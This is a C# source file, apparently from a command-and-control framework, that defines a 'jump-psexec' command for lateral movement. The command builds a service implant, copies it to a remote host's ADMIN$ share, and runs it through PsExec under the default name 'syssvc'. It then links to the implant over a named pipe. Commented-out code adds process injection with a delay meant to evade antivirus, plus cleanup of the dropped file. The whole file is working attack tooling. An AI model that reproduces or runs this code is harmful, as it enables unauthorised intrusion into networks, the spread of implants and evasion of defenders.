using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Common.AgentCommands.Composite;
using Common.CommandLine.Core;
using Common.Models;
using Common.Payload;
using Shared;

namespace Common.AgentCommands.Custom
{
    public class JumpPsExecCommandOptions : CommandOption
    {
        [Argument("target", "Target where the service will be started", 0)]
        public string Target { get; set; }
        [Option("v", "verbose", "Show details of the command execution.")]
        public bool verbose { get; set; }

        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "jmppsexec")]
        public string pipe { get; set; }

        [Option("f", "file", "FileName of payload.")]
        public string file { get; set; }

        [Option("p", "path", "Name of the folder to upload the payload.", DefaultValue = "ADMIN$")]
        public string path { get; set; }

        [Option("s", "service", "Name of service.", DefaultValue = "syssvc")]
        public string Service { get; set; }

        /* [CommandOption("-i", "--inject", "If the payload should be an injector")]
         public bool inject { get; set; }

         [CommandOption("-id", "--injectDelay", "Delay before injection (AV evasion)", 30)]
         public int injectDelay { get; set; }

         [CommandOption("-ip", "--injectProcess", "Process path used for injection", null)]
         public string injectProcess { get; set; }*/

        [Option("x86", "x86", "Generate a x86 architecture executable")]
        public bool x86 { get; set; }
    }

    [Command("jump-psexec", "Lateral Movement using psexec", Category = AgentCommandCategories.Composite)]
    public class JumpPsExecCommand : AgentCompositeCommand<JumpPsExecCommandOptions>
    {
        protected override async Task<bool> Run(AgentCommandContext context, JumpPsExecCommandOptions options)
        {
            var endpoint = ConnexionUrl.FromString($"pipe://*:{options.pipe}");
            var payloadOptions = new ImplantConfig()
            {
                StoreImplant = false,
                Architecture =  options.x86 ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = false,
                IsVerbose = options.verbose,
                Type = ImplantType.Service,
                //InjectionDelay =  options.injectDelay,
                //IsInjected = options.inject,
                //InjectionProcess = options.injectProcess
            };

            //if (!string.IsNullOrEmpty(options.injectProcess))
            //    payloadOptions.InjectionProcess = options.injectProcess;

            context.WriteInfo($"[>] Generating Implant!");
            var implant = await context.GeneratePayload(payloadOptions);
            if (implant == null)
            {
                context.WriteError($"[X] Generation Failed!");
                return false;
            }
            else
                context.WriteSuccess($"[+] Generation succeed!");


            context.WriteInfo($"[>] Preparing Agent command flow...");

            var fileName = string.IsNullOrEmpty(options.file) ? implant.Config.ImplantName + ".exe" : options.file;
            if (Path.GetExtension(fileName).ToLower() != ".exe")
                fileName += ".exe";

            string path = "\\\\" + options.Target + '\\' + options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;

            context.Echo($"[>] Saving implant to {path}");
            context.Upload(Convert.FromBase64String(implant.Data), path);
            context.Delay(1);

            context.Echo($"[>] Executing PsExec");
            context.PsExec(options.Target, path, options.Service);

            context.Delay(2);


            //if (options.inject)
            //{
            //    context.Echo($"Waiting {options.injectDelay + 10}s to evade antivirus");
            //    context.Delay(options.injectDelay + 10);

            //    context.Echo($"Removing injector {path}");
            //    context.Shell($"del {path}");
            //}
            //else
            //{
                context.Echo($"[!] Don't forget to remove executable after use! : shell del {path}");
            //}

            var targetEndPoint = ConnexionUrl.FromString($"pipe://{options.Target}:{options.pipe}");
            context.Echo($"[>] Linking to {targetEndPoint}");
            context.Link(targetEndPoint);

            context.Echo($"[*] Execution done!");
            context.Echo(Environment.NewLine);


            return true;
        }
    }
}
